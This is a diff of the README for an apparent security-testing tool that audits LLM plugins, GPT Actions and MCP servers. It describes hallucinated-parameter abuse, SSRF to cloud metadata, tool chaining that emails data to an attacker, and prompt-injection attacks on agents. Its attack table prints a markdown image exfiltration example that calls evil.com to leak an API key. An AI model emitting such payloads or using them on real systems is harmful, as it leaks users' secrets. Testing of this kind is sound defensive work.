@@ -1,176 +1,288 @@
-<div align="center">
+<![CDATA[<div align="center">
 
-# 🕵️ LLM Plugin Abuse Tester
+```
+ ██╗     ██╗     ███╗   ███╗    ██████╗ ██╗     ██╗   ██╗ ██████╗ ██╗███╗   ██╗
+ ██║     ██║     ████╗ ████║    ██╔══██╗██║     ██║   ██║██╔════╝ ██║████╗  ██║
+ ██║     ██║     ██╔████╔██║    ██████╔╝██║     ██║   ██║██║  ███╗██║██╔██╗ ██║
+ ██║     ██║     ██║╚██╔╝██║    ██╔═══╝ ██║     ██║   ██║██║   ██║██║██║╚██╗██║
+ ███████╗███████╗██║ ╚═╝ ██║    ██║     ███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║
+ ╚══════╝╚══════╝╚═╝     ╚═╝    ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝
+                    ████████╗███████╗███████╗████████╗███████╗██████╗
+                    ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
+                       ██║   █████╗  ███████╗   ██║   █████╗  ██████╔╝
+                       ██║   ██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗
+                       ██║   ███████╗███████║   ██║   ███████╗██║  ██║
+                       ╚═╝   ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
+```
 
-[![Build Status](https://img.shields.io/github/actions/workflow/status/Ak-cybe/llm-plugin-tester/ci.yml?style=flat-square&logo=github)](https://github.com/Ak-cybe/llm-plugin-tester/actions)
-[![PyPI version](https://img.shields.io/pypi/v/llm-plugin-tester?style=flat-square&logo=pypi&logoColor=white)](https://pypi.org/project/llm-plugin-tester/)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-3776AB?style=flat-square&logo=python&logoColor=white)](https://www.python.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg?style=flat-square)](https://opensource.org/licenses/MIT)
-[![Code Style: Black](https://img.shields.io/badge/code%20style-black-000000.svg?style=flat-square)](https://github.com/psf/black)
+**Automated security testing for LLM plugins — GPT Actions, MCP Servers, LangChain Tools**
 
-**Automated Security Auditing for the Agentic AI Era**
+*Find the vulnerabilities that AI itself creates.*
 
-Because trusting third-party plugins blindly equals a data breach.
+[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg?style=flat-square&logo=python&logoColor=white)](https://www.python.org/downloads/)
+[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg?style=flat-square)](LICENSE)
+[![Tests](https://img.shields.io/badge/tests-55%20passed-brightgreen.svg?style=flat-square&logo=pytest)](#testing)
+[![Version](https://img.shields.io/badge/version-0.1.0-orange.svg?style=flat-square)](#changelog)
+[![OWASP LLM Top 10](https://img.shields.io/badge/OWASP-LLM%20Top%2010-red.svg?style=flat-square)](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
 
-[Problem](#-the-problem) • [Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Attack Vectors](#-attack-vectors) • [Roadmap](#-roadmap)
+[Quick Start](#-quick-start) •
+[Why This Tool](#-the-problem) •
+[Features](#-features) •
+[Bug Bounty Guide](docs/BUG_BOUNTY_GUIDE.md) •
+[Attack Vectors](docs/ATTACK_VECTORS.md)
 
----
 </div>
 
-## 💡 The Problem
-
-When you authorize an LLM plugin (GPT Action, MCP Server, or Agent Tool), you grant a **probabilistic model** the authority to execute **privileged actions** inside your security perimeter.
-
-> **"One vulnerable plugin is enough to compromise your entire session."**
-
-LLM providers do NOT audit how third-party plugins:
-*   Validate model-generated inputs (hallucinations)
-*   Prevent Server-Side Request Forgery (SSRF)
-*   Protect against Indirect Prompt Injection
-*   Detect Data Exfiltration attempts
-
-**This tool detects and proves those failures automatically.**
-
 ---
 
-## ✨ Features
+## 🚨 The Problem
 
-### 🔍 Reconnaissance Engine (Static Analysis)
-Audit configurations without sending a single packet.
-- **GPT Actions:** Parse `ai-plugin.json` and OpenAPI specs for risky endpoints (`/exec`, `/sql`).
-- **MCP Servers:** Audit `mcp-config.json` for excessive file access (`/`, `~`) and dangerous permissions.
-- **Reporting:** Generates detailed JSON reports with severity ratings (CRITICAL / HIGH / MEDIUM).
+LLMs don't just *use* tools — they **hallucinate how to use them**.
 
-### 🧪 Validation Oracle (Active Testing)
-The "smoking gun" proof for bug bounty reports.
-- **Zero-Click Exfiltration:** Detects markdown image rendering attacks.
-- **SSRF Confirmation:** Catches cloud metadata access attempts.
-- **Secret Extraction:** Logs query parameters containing keys/tokens.
-- **Evidence Logging:** Timestamped proof for triagers.
+When ChatGPT calls a plugin, it can invent parameters like `is_admin: true` or `bypass_auth: true` that *aren't in the API schema* — and if the backend doesn't validate strictly, **it works**. This isn't a hypothetical. It's happening in production right now.
 
----
+```
+┌─────────────┐    ┌──────────────┐    ┌─────────────────┐
+│  User Prompt │───▶│   LLM Brain  │───▶│  Plugin/Tool API │
+│              │    │              │    │                 │
+│ "Get my data"│    │ Generates:   │    │ Receives:       │
+│              │    │ {             │    │ {               │
+│              │    │   user_id: 1, │    │   user_id: 1,   │
+│              │    │   is_admin: ▓ │◄── │   is_admin: ▓   │ ← NOT IN SCHEMA
+│              │    │ }             │    │ }               │   BUT HONORED!
+└─────────────┘    └──────────────┘    └─────────────────┘
+```
 
-## 🚀 Installation
+**Traditional security tools don't catch this** because the vulnerability exists in the *gap between AI intent and API reality*.
+
+## 🔍 What This Tool Does
+
+LLM Plugin Tester finds exploitable flaws across the entire LLM plugin ecosystem:
+
+| Attack Vector | Severity | What We Detect |
+|:---|:---:|:---|
+| 🧠 **Hallucinated Parameters** | 🔴 CRITICAL | LLM invents `admin`, `debug`, `bypass_auth` params that backends accept |
+| 🌐 **SSRF via Plugins** | 🔴 CRITICAL | URL params fetching `169.254.169.254`, internal services, `file://` |
+| 🖼️ **Markdown Exfiltration** | 🟠 HIGH | Zero-click data theft via `![img](https://evil.com?secret={{api_key}})` |
+| ⛓️ **Tool Chaining** | 🟠 HIGH | Read DB → Email to attacker — without user approval |
+| 🔓 **Over-Permissions** | 🟡 MEDIUM | Plugins requesting `execute`, `shell`, `admin` capabilities |
+| 💀 **LangGrinch RCE** | 🔴 CRITICAL | LangChain deserialization → arbitrary code execution |
+| 🔧 **MCP Server Abuse** | 🟠 HIGH | Filesystem access, shell execution, network pivoting |
+
+## 💡 Why Existing Tools Miss This
+
+| | **Burp/ZAP** | **Snyk/Semgrep** | **Garak** | **LLM Plugin Tester** |
+|:---|:---:|:---:|:---:|:---:|
+| SSRF in plugin params | ❌ | ❌ | ❌ | ✅ |
+| Hallucinated parameters | ❌ | ❌ | ❌ | ✅ |
+| Markdown exfiltration | ❌ | ❌ | ❌ | ✅ |
+| MCP config audit | ❌ | ❌ | ❌ | ✅ |
+| GPT Action analysis | ❌ | ❌ | ❌ | ✅ |
+| Tool chain validation | ❌ | ❌ | ⚠️ Partial | ✅ |
+| Bug bounty reports | ❌ | ❌ | ❌ | ✅ |
+
+> **We're not replacing these tools.** We cover the gap they can't reach — the AI-to-API interface.
+
+## ⚡ Quick Start
+
+### Installation
 
 ```bash
-# Clone the repository
+# Clone and install
 git clone https://github.com/Ak-cybe/llm-plugin-tester.git
 cd llm-plugin-tester
-
-# Install in editable mode
 pip install -e .
 
-# Verify installation
-llm-plugin-tester --help
+# With proxy support (mitmproxy)
+pip install -e ".[proxy]"
+
+# With dev tools
+pip install -e ".[dev]"
 ```
 
----
+### 30-Second Demo
 
-## 🎬 Usage
+**1. Analyze a GPT Action for vulnerabilities:**
+```bash
+$ llm-plugin-tester analyze -t gpt-action -m examples/malicious-gpt-action/ai-plugin.json
+```
+```
+🔍 LLM Plugin Security Analyzer
 
-### 1. Analyze a GPT Action (Static)
-Identify vulnerabilities in an OpenAPI specification.
+📄 Analyzing GPT Action: examples/malicious-gpt-action/ai-plugin.json
+
+🚨 Found 5 security issues:
+  CRITICAL: 2 | HIGH: 2 | MEDIUM: 1
+
+┌──────────┬─────────────────────┬──────────────┬──────────────────────────────────────────┐
+│ Severity │ Endpoint            │ Risky Params │ Reason                                   │
+├──────────┼─────────────────────┼──────────────┼──────────────────────────────────────────┤
+│ CRITICAL │ POST /execute       │ command      │ Accepts potentially dangerous parameters  │
+│ HIGH     │ GET /query          │ sql, url     │ Accepts potentially dangerous parameters  │
+│ HIGH     │ DELETE /admin/delete│ file_path    │ Accepts potentially dangerous parameters  │
+│ MEDIUM   │ POST /execute       │ -            │ Schema allows arbitrary additional props  │
+│ MEDIUM   │ /*                  │ -            │ Uses API key auth: shared credentials     │
+└──────────┴─────────────────────┴──────────────┴──────────────────────────────────────────┘
+
+✅ Report saved to: reports/gpt-action-report-ai-plugin.json
+```
+
+**2. Audit an MCP server configuration:**
+```bash
+$ llm-plugin-tester analyze -t mcp -c examples/vulnerable-mcp-server/mcp-config.json
+```
+```
+🚨 Found 6 security issues:
+  CRITICAL: 3 | HIGH: 1 | MEDIUM: 2
+
+┌──────────┬────────────────────┬─────────────────────┬─────────────────────────────────────┐
+│ Severity │ Server             │ Issue Type          │ Description                         │
+├──────────┼────────────────────┼─────────────────────┼─────────────────────────────────────┤
+│ CRITICAL │ code-executor      │ DANGEROUS_PERMISSION│ Server has dangerous permission: exe │
+│ CRITICAL │ database-connector │ DANGEROUS_PERMISSION│ Server has dangerous permission: adm │
+│ HIGH     │ filesystem-agent   │ EXCESSIVE_FILE_ACCE │ Server has access to broad path: /   │
+│ MEDIUM   │ filesystem-agent   │ CORS_WILDCARD       │ CORS wildcard allows any origin      │
+└──────────┴────────────────────┴─────────────────────┴─────────────────────────────────────┘
+```
+
+**3. Start the Validation Oracle (exfiltration listener):**
+```bash
+$ llm-plugin-tester oracle start --port 8080
+
+🎯 Starting Validation Oracle
+   Listening on: http://0.0.0.0:8080
+   Ready to catch exfiltration attempts!
+
+# When exfiltration hits your server:
+🚨 EXFILTRATION DETECTED - IMAGE_EXFILTRATION
+   Severity: HIGH
+   Path: /logo.png
+   Query Params: {'secret': 'sk-proj-1234567890'}
+```
+
+## 🏗️ Architecture
+
+```
+llm-plugin-tester/
+├── src/llm_plugin_tester/
+│   ├── recon/              # Module 1: Static Analysis
+│   │   ├── openapi_parser  # GPT Action / OpenAPI vulnerability scanner
+│   │   └── mcp_auditor     # MCP server config security auditor
+│   │
+│   ├── proxy/              # Module 2: Traffic Interception
+│   │   └── interceptor     # mitmproxy addon with 3 real-time detectors:
+│   │       ├── HallucinationDetector  → flags params not in schema
+│   │       ├── SSRFDetector           → 16 regex patterns for internal access
+│   │       └── SensitiveDataDetector  → catches API keys, tokens, secrets
+│   │
+│   ├── oracle/             # Module 4: Validation Oracle
+│   │   └── listener        # FastAPI catch-all server for proving exfiltration
+│   │
+│   ├── payloads/           # Attack Payload Library
+│   │   └── attack_payloads # 75+ payloads across 7 categories
+│   │
+│   ├── cli.py              # Typer CLI with rich output
+│   └── config.py           # Pydantic settings with .env support
+│
+├── tests/                  # 55 tests, 5 test files, 100% module coverage
+├── reports/templates/      # HackerOne-ready report templates
+├── docs/                   # Attack vectors guide + bug bounty playbook
+└── examples/               # Intentionally vulnerable plugins for testing
+```
+
+## 🎯 Bug Bounty Integration
+
+This tool is built for bug bounty hunters. Every finding maps directly to a report:
+
+### Target Programs
+| Platform | Focus | Est. Payout |
+|:---|:---|:---:|
+| [**OpenAI**](https://hackerone.com/openai) | GPT Actions, plugins | $200–$20,000 |
+| [**Google**](https://bughunters.google.com) | Gemini Extensions | $500–$31,337 |
+| [**Microsoft**](https://msrc.microsoft.com) | Copilot plugins | $500–$15,000 |
+| **Anthropic** | MCP servers | Responsible disclosure |
+
+### Ready-to-File Templates
+- [`reports/templates/ssrf_report.md`](reports/templates/ssrf_report.md) — SSRF via plugin URL parameter (CVSS 9.0)
+- [`reports/templates/markdown_exfil_report.md`](reports/templates/markdown_exfil_report.md) — Zero-click data exfiltration (CVSS 7.5)
+
+### Workflow
+```
+1. Find target plugin     →  Browse plugin stores, MCP configs
+2. Static analysis        →  llm-plugin-tester analyze
+3. Deploy oracle          →  llm-plugin-tester oracle start
+4. Test payloads          →  75+ ready-to-use attack templates
+5. Generate report        →  HackerOne-ready with CVSS scores
+6. Collect bounty         →  💰
+```
+
+> 📖 **Full playbook:** [Bug Bounty Integration Guide](docs/BUG_BOUNTY_GUIDE.md)
+
+## 🧪 Testing
 
 ```bash
-llm-plugin-tester analyze \
-  --type gpt-action \
-  --manifest ./examples/vulnerable-plugin/ai-plugin.json \
-  --output-dir ./reports
+# Run all tests
+pytest tests/ -v
+
+# Expected output
+=================== 55 passed in 2.4s ===================
 ```
 
-**Output:**
-```text
-🚨 Found 3 security issues:
-  CRITICAL: 1 | HIGH: 1 | MEDIUM: 1
+| Test File | Tests | What's Covered |
+|:---|:---:|:---|
+| `test_openapi_parser.py` | 5 | GPT Action detection, risky params, auth analysis |
+| `test_mcp_auditor.py` | 7 | File access, CORS, permissions, hooks |
+| `test_oracle.py` | 7 | GET/POST exfiltration, severity scoring |
+| `test_proxy.py` | 13 | SSRF, hallucination, sensitive data detectors |
+| `test_payloads.py` | 23 | All 7 payload categories + generators |
 
-┌──────────┬─────────────────┬──────────────┬─────────────────────────────────┐
-│ Severity │ Endpoint        │ Risky Params │ Reason                          │
-├──────────┼─────────────────┼──────────────┼─────────────────────────────────┤
-│ CRITICAL │ POST /execute   │ command      │ Accepts arbitrary command exec  │
-│ HIGH     │ GET /fetch      │ url          │ Potential SSRF vector           │
-└──────────┴─────────────────┴──────────────┴─────────────────────────────────┘
-```
+## 🗺️ Roadmap
 
-### 2. Audit an MCP Server Configuration
-Check your local Claude Desktop or VS Code MCP settings.
-
-```bash
-llm-plugin-tester analyze \
-  --type mcp \
-  --config ~/.config/claude/mcp-config.json
-```
-
-**Detects:**
-- Root filesystem access (`/` or `C:\`)
-- Broad network permissions
-- Dangerous capabilities (shell access)
-
-### 3. Start the Validation Oracle
-Run a listener to catch exfiltration attempts during testing.
-
-```bash
-# Start the listener on port 8080
-llm-plugin-tester oracle start --port 8080
-```
-
----
-
-## 🛡️ Supported Attack Vectors
-
-| Vector | Description | Status |
-| :--- | :--- | :--- |
-| **Over-Permissions** | Plugin requests more scopes than used | ✅ Supported |
-| **SSRF** | Access internal metadata (AWS/GCP/K8s) | ✅ Supported |
-| **Markdown Exfil** | Zero-click data theft via image rendering | ✅ Supported |
-| **Hallucinations** | Model invents `admin=true` parameters | 🚧 Roadmap |
-| **Tool Chaining** | Multi-step attacks (Read DB -> Email) | 🚧 Roadmap |
-| **Prompt Injection** | Indirect injection via RAG documents | 🚧 Roadmap |
-
-See [docs/ATTACK_VECTORS.md](docs/ATTACK_VECTORS.md) for detailed exploitation guides.
-
----
-
-## 💰 Bug Bounty Guide
-
-This tool is **bug-bounty ready**. We include templates and payloads specifically designed for HackerOne and Bugcrowd reports.
-
-*   [**Bug Bounty Guide**](docs/BUG_BOUNTY_GUIDE.md): Workflow, pricing estimates, and target lists.
-*   [**Attack Payloads**](src/llm_plugin_tester/payloads/attack_payloads.py): Copy-paste payloads for SSRF, XSS, and Injection.
-*   [**Report Templates**](reports/templates/): Pre-formatted Markdown reports for submission.
-
----
+| Version | Status | Features |
+|:---|:---:|:---|
+| **v0.1** | ✅ Released | Recon engine, Oracle, Proxy detectors, 75+ payloads |
+| **v0.2** | 🔧 In Progress | Live mitmproxy integration, SSRF mutation engine |
+| **v0.3** | 📋 Planned | Promptfoo/Garak fuzzer integration, auto-exploit chains |
+| **v1.0** | 🎯 Target | Full pipeline: discover → intercept → fuzz → report → file |
 
 ## 🤝 Contributing
 
-We welcome contributions from the security community!
+We welcome contributions! Especially:
 
-1.  Fork the repo
-2.  Create your feature branch (`git checkout -b feature/amazing-feature`)
-3.  Commit your changes (`git commit -m 'feat: Add amazing feature'`)
-4.  Push to the branch (`git push origin feature/amazing-feature`)
-5.  Open a Pull Request
+- 🆕 **New detectors** — LangChain tool analysis, CrewAI, AutoGPT
+- 🧪 **Attack payloads** — Real-world exploits you've found
+- 📄 **Report templates** — Additional bug bounty templates
+- 🌐 **Proxy improvements** — Better mitmproxy integration
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup.
+See [CONTRIBUTING.md](CONTRIBUTING.md) for setup instructions.
 
----
+## ⚖️ Legal & Ethics
 
-## ⚖️ Legal & Disclaimer
+> **This tool is for authorized security testing only.**
 
-**Usage of this tool for attacking targets without prior mutual consent is illegal.**
+- ✅ Test your own plugins and integrations
+- ✅ Bug bounty programs with explicit scope
+- ✅ Security research with responsible disclosure
+- ❌ Do NOT test production systems without authorization
+- ❌ Do NOT use findings for malicious purposes
 
-LLM Plugin Tester is created for:
-*   Security researchers auditing their own systems.
-*   Developers securing their AI integrations.
-*   Authorized bug bounty engagements.
+See [SECURITY.md](SECURITY.md) for our vulnerability disclosure policy.
 
-The developers assume no liability and are not responsible for any misuse or damage caused by this program.
+## 📜 License
+
+[MIT License](LICENSE) — Use freely, attribute kindly.
 
 ---
 
 <div align="center">
 
-**[Report Bug](https://github.com/Ak-cybe/llm-plugin-tester/issues)** • **[Request Feature](https://github.com/Ak-cybe/llm-plugin-tester/issues)**
+**Built for the hunters who protect AI from itself.**
 
-Made with ❤️ by [Ak-cybe](https://github.com/Ak-cybe)
+⭐ Star this repo if it helps you find bugs!
+
+[Report a Bug](https://github.com/Ak-cybe/llm-plugin-tester/issues) •
+[Request a Feature](https://github.com/Ak-cybe/llm-plugin-tester/issues) •
+[Discussions](https://github.com/Ak-cybe/llm-plugin-tester/discussions)
 
 </div>
+]]>
